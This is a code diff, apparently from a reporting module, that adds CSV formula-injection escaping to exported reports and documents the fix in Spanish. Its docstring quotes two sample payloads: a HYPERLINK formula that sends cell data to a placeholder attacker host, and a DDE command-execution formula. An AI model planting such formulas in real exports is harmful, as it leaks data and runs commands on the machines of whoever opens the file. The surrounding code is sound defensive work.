@@ -408,18 +408,64 @@ FILE_BASENAMES: dict[str, str] = {
 # ───────────────────────────── renderizado CSV ─────────────────────────────
 
 
+#: Caracteres con los que una hoja de calculo (Excel, LibreOffice,
+#: Google Sheets) interpreta una celda como una FORMULA en vez de texto.
+PREFIJOS_FORMULA = ("=", "+", "-", "@", "\t", "\r")
+
+
+def escapar_celda_csv(valor: object) -> object:
+    """Neutraliza una celda que una hoja de calculo podria ejecutar.
+
+    OJO (T-77, 2026-10-22): los informes CSV meten datos que pone un
+    usuario —la matricula de un vehiculo (la introduce el conductor y el
+    alta manual no valida el formato) y el nombre de la sucursal—. Sin
+    esto, una celda que empieza por ``=`` se ejecuta al abrir el fichero
+    en Excel o LibreOffice: ``=HYPERLINK("http://atacante/?d="&A1,"clic")``
+    filtra datos de la hoja y ``=cmd|'/c calc'!A0`` ejecuta un comando en
+    Windows. Es el CSV injection clasico.
+
+    El arreglo es el de OWASP: anteponer un apostrofo, que es lo que hacen
+    las hojas de calculo para marcar "esto es texto, no una formula". El
+    apostrofo **queda en el fichero**, asi que quien lo parsee con codigo
+    tiene que saberlo (esta documentado aqui y en el API interno).
+    """
+    if not isinstance(valor, str) or not valor:
+        return valor
+    if valor.startswith(PREFIJOS_FORMULA) and not _es_numero(valor):
+        return "'" + valor
+    return valor
+
+
+def _es_numero(texto: str) -> bool:
+    """¿El texto es un numero? Un "-12.50" no es una formula.
+
+    Sin esta distincion, todos los informes de margenes con perdidas
+    mostrarian "'-12.50" en vez de "-12.50" (el "-" de un negativo no es
+    un caracter de formula: una hoja de calculo lo lee como numero).
+    """
+    try:
+        float(texto)
+    except ValueError:
+        return False
+    return True
+
+
 def render_report_csv(report: ReportTable) -> str:
     """Serializa el informe a CSV: primera fila = cabecera, luego datos.
 
     El separador es ``,`` (convención del repo: el CSV de márgenes ya usa
     el ``csv.writer`` por defecto) y no se añade BOM, de modo que
     ``csv.DictReader`` lo lee tal cual.
+
+    Todas las celdas pasan por ``escapar_celda_csv`` (T-77): el informe
+    lleva datos que pone el usuario (matricula, nombre de la sucursal) y
+    una celda que empieza por ``=`` seria una formula al abrir el CSV.
     """
     buf = io.StringIO()
     writer = csv.writer(buf)
-    writer.writerow(report.columns)
+    writer.writerow([escapar_celda_csv(c) for c in report.columns])
     for row in report.rows:
-        writer.writerow(row)
+        writer.writerow([escapar_celda_csv(c) for c in row])
     return buf.getvalue()
 
 
